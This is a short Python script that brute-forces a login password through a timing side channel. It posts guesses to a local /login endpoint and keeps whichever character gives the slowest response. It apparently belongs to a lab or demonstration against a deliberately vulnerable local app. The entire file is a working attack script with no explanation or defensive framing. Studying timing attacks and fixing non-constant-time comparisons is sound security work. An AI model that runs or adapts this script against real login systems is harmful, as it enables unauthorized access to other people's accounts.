import requests
import string
import time

url = "http://127.0.0.1:5000/login"

charset = string.ascii_lowercase + string.digits

guessed_password = ""
password_length = 9

for i in range(password_length):

    max_time = 0
    correct_char = ""

    for c in charset:

        attempt = guessed_password + c

        start = time.time()

        requests.post(url, data={"password": attempt})

        end = time.time()

        elapsed = end - start

        if elapsed > max_time:
            max_time = elapsed
            correct_char = c

    guessed_password += correct_char

    print("Discovered so far:", guessed_password)

print("\nRecovered Password:", guessed_password)